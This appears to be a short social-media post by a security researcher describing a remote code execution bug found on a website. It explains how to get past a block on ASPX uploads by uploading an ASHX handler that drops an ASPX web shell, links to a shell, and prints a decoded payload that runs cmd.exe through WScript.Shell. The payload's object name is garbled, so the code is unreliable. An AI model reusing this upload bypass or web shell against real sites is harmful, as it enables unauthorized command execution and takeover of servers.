<script src="https://gist.github.com/hunter-0x7/ddf8bd71b22f99b3625b819f1064d2ce.js"></script>
one of the RCEs: a website was blocking ASPX file uploads. bypassed it by uploading an ASHX file and triggering it to create an ASPX shell on same dir.

ASHX shell: https://lnkd.in/dEvzw7EE 

I tried the existing ASHX shells but they failed, I edited one of them to get the C# exploit code as base64 and 🔥.

decoded base64:
var shell = new ActiveXObject("http://WScript.Shell");
var cmd = "cmd.exe /c dir";
var output = shell.Exec(cmd).StdOut.ReadAll();
output;
